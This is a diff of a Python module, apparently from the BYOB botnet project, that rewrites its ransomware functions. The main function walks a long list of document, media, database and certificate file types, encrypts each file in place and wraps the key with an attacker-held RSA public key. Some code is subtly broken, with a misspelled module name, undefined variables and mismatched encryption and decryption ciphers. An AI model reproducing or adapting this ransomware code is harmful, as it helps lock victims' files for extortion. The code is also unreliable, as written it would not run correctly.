@@ -18,12 +18,9 @@ import urllib
 import logging
 import cStringIO
 
-logging.basicConfig(format='(%message%)s', level=logging.DEBUG, handler=logging.StreamHandler())
-
 # external modules
 
 try:
-    import _winreg
     import Crypto.Util
     import Crypto.Hash.MD5
     import Crypto.Hash.HMAC
@@ -31,7 +28,14 @@ try:
     import Crypto.PublicKey.RSA
     import Crypto.Cipher.PKCS1_OAEP
 except ImportError as e:
-    logging.debug(e)
+    execfile('__init__.py')
+    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
+
+try:
+    import _winreg
+except ImportError:
+    pass
+
 
 
 def diffiehellman(connection):
@@ -49,9 +53,9 @@ def diffiehellman(connection):
             x  = pow(xB, a, p)
             return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
         except Exception as e:
-            return "{} error: {}".format(diffiehellman.func_name, str(e))
+            __debugger.debug("{} error: {}".format(diffiehellman.func_name, str(e)))
     else:
-        return "{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection))
+        __debugger.debug("wrong input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection)))
 
 def encrypt_aes(data, key):
     """
@@ -63,7 +67,7 @@ def encrypt_aes(data, key):
         output = b''.join((cipher.nonce, tag, ciphertext))
         return base64.b64encode(output)
     except Exception as e:
-        return "{} error: {}".format(encrypt_aes.func_name, str(e))
+        __debugger.debug("{} error: {}".format(encrypt_aes.func_name, str(e)))
 
 def decrypt_aes(data, key):
     """
@@ -78,7 +82,7 @@ def decrypt_aes(data, key):
         try:
             return cipher.decrypt(ciphertext)
         except Exception as e2:
-            return "{} error: {}".format(decrypt_aes.func_name, str(e2))
+            __debugger.debug("{} error: {}".format(decrypt_aes.func_name, str(e2)))
 
 def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
     """
@@ -124,58 +128,56 @@ def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x
         result.append(output)
     return str().join(result).rstrip(padding)
 
-def encrypt_file(args):
+def encrypt_file(filepath, public_key):
     """
     Use a 256-bit key to encrypt a file with an AES cipher in authenticated OCB mode
     """
     try:
-        if os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
-            aes_key = Crypto.Hash.MD5.new(Crypto.Ransom.get_random_bytes(16)).hexdigest()
-            ransom  = _encrypt_file(path, key=aes_key)
-            cipher  = Crypto.Cipher.PKCS1_OAEP.new(ransom.pubkey)
-            key     = base64.b64encode(cipher.encrypt(aes_key))
-            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\BYOB', 0, _winreg.KEY_WRITE)
-            _winreg.SetValueEx(reg_key, path, 0, _winreg.REG_SZ, key)
-            _winreg.CloseKey(reg_key)            
+        pubkey, filepath = args
+        if os.path.isfile(filepath) and os.path.splitext(path)[1] in ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg','.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc', '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx', '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf', '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpg', '.jpe', '.jpg', '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw', '.rwl', '.rw2', '.r3d', '.ptx', '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.tmp','.py','.php','.html','.css','.js','.rb','.xml']:
+            if isinstance(public_key, Crypto.PublicKey.RsaKey):
+                key = Crypto.Ransom.get_random_bytes(8)
+                with open(filepath, 'rb') as fp:
+                    data = fp.read()
+                with open(filepath, 'wb') as fd:
+                    fd.write(encrypt_xor(data, key))
+                cipher  = Crypto.Cipher.PKCS1_OAEP.new(public_key)
+                key     = base64.b64encode(cipher.encrypt(key))
+                return filepath, key
+            else:
+                __debugger.debug("Invalid RSA key")
+        else:
+            __debugger.debug("File '{}' not found".format(filepath))
     except Exception as e:
-        return "{} error: {}".format(_encrypt.func_name, str(e))
-
-def decrypt_file(args):
-    """
-    Use a 256-bit key to decrypt a file encrypted by an AES cipher in authenticated OCB mode
-    """
-    try:
-        rsa_key, aes_key, path = args
-        cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
-        aes     = cipher.decrypt(base64.b64decode(aes_key))
-        result  = _decrypt_file(path, key=aes)
-    except Exception as e:
-        return "{} error: {}".format(decrypt.func_name, str(e))
+        __debugger.debug("{} error: {}".format(_encrypt.func_name, str(e)))
 
 def _encrypt_file(filepath, key):
     try:
         if os.path.isfile(filepath):
-            with open(filepath, 'rb') as fp:
-                plaintext = fp.read()
-            ciphertext = encrypt_aes(plaintext, key)
-            with open(filepath, 'wb') as fd:
-                fd.write(ciphertext)
-            return filepath
-        else:
-            return "File '{}' not found".format(filepath)
-    except Exception as e:
-        return "{} error: {}".format(encrypt_file.func_name, str(e))
 
-def _decrypt_file(filepath, key):
+            return True
+        else:
+            __debugger.debug("File '{}' not found".format(filepath))
+    except Exception as e:
+        __debugger.debug("{} error: {}".format(encrypt_file.func_name, str(e)))
+    return False
+
+def decrypt_file(filepath, key):
     try:
         if os.path.isfile(filepath):
-            with open(filepath, 'rb') as fp:
-                ciphertext = fp.read()
-            plaintext = decrypt_aes(ciphertext, key)
-            with open(filepath, 'wb') as fd:
-                fd.write(plaintext)
-            return filepath
+            if isinstance(rsa_key, Crypto.PublicKey.RsaKey):
+                cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
+                key = cipher.decrypt(base64.b64decode(key))
+                with open(filepath, 'rb') as fp:
+                    ciphertext = fp.read()
+                plaintext = decrypt_aes(ciphertext, key)
+                with open(filepath, 'wb') as fd:
+                    fd.write(plaintext)
+                return True
+            else:
+                __debugger.debug("Invalid RSA private key")
         else:
-            return "File '{}' not found".format(filepath)
+            __debugger.debug("File '{}' not found".format(filepath))
     except Exception as e:
-        return "{} error: {}".format(decrypt_file.func_name, str(e))
+        __debugger.debug("{} error: {}".format(decrypt_file.func_name, str(e)))
+    return False
